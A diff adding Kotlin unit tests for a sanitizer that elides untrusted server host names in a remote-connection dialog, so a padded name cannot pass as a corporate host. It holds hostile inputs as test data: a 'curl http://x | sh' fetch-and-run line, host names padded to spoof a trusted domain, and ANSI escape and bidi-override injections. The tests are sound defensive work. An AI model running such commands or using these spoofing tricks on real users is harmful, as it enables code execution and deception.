@@ -97,4 +97,68 @@ class SanitizeServerTextTest {
         assertEquals("echo done\ncurl http://x | sh", sanitizeServerText("echo done\rcurl http://x | sh", 600, allowNewlines = true))
     }
 
+    @Test
+    fun `a host that fits is drawn whole and unmarked`() {
+        assertEquals("vpn.corp.example.com", sanitizeServerHost("vpn.corp.example.com"))
+    }
+
+    @Test
+    fun `a padded host keeps the part that says which domain it really is`() {
+        // The redirect an RDP broker can name: cut at the head alone, this reads as the corporate
+        // host with a long tail of noise, and the user vouches for the attacker's certificate. DNS
+        // allows 253 characters, so the padding costs the server nothing.
+        val padded = "vpn.corp.example.com." + "a".repeat(140) + ".evil.net"
+        val drawn = sanitizeServerHost(padded)
+
+        assertTrue(drawn.startsWith("vpn.corp.example.com."), "the head a user recognizes must survive")
+        assertTrue(drawn.endsWith(".evil.net"), "the domain the name actually sits in must survive")
+        assertTrue(drawn.contains('\u2026'), "a name that was cut must not read as a whole one")
+        assertTrue(drawn.length <= MAX_UNTRUSTED_LABEL_CHARS, "the line must still be bounded")
+    }
+
+    @Test
+    fun `a host longer than DNS can carry is still bounded`() {
+        val flood = "a".repeat(40_000)
+        assertTrue(sanitizeServerHost(flood).length <= MAX_UNTRUSTED_LABEL_CHARS)
+    }
+
+    @Test
+    fun `a host past what DNS can carry still shows the domain it really sits in`() {
+        // The elision reads the tail from the raw name, not from the scan that stopped at 253: a
+        // longer string leaves that scan sitting in the middle of the padding, and drawing its end
+        // as the suffix would put the attacker's own text exactly where the user checks.
+        val padded = "vpn.corp.example.com." + "a".repeat(4_000) + ".evil.net"
+
+        val drawn = sanitizeServerHost(padded)
+
+        assertTrue(drawn.endsWith(".evil.net"), "the padding was drawn where the suffix belongs")
+        assertTrue(drawn.startsWith("vpn.corp.example.com."), "the head a user recognizes must survive")
+        assertTrue(drawn.length <= MAX_UNTRUSTED_LABEL_CHARS, "the line must still be bounded")
+    }
+
+    @Test
+    fun `neither end of an elided host is cut through an astral character`() {
+        // Both cuts count UTF-16 units, so either can fall between the halves of a pair — and half
+        // a pair draws as the replacement glyph, in the label and in what a screen reader says.
+        val padded = "😀".repeat(200) + ".evil.net"
+
+        val drawn = sanitizeServerHost(padded)
+
+        val orphaned = drawn.withIndex().any { (i, ch) ->
+            (ch.isHighSurrogate() && (i + 1 == drawn.length || !drawn[i + 1].isLowSurrogate())) ||
+                (ch.isLowSurrogate() && (i == 0 || !drawn[i - 1].isHighSurrogate()))
+        }
+        assertFalse(orphaned, "an elided host was cut through a surrogate pair")
+        assertTrue(drawn.endsWith(".evil.net"), "the suffix must survive the trim either side of it")
+    }
+
+    @Test
+    fun `a host is filtered like any other server text before it is elided`() {
+        val hostile = "prod\u001B[2J.example.com\u202Eevil"
+        val drawn = sanitizeServerHost(hostile)
+
+        assertFalse(drawn.contains('\u001B'), "escape characters must not reach the dialog")
+        assertFalse(drawn.any { it in '\u202A'..'\u202E' }, "bidi overrides must be dropped")
+    }
+
 }
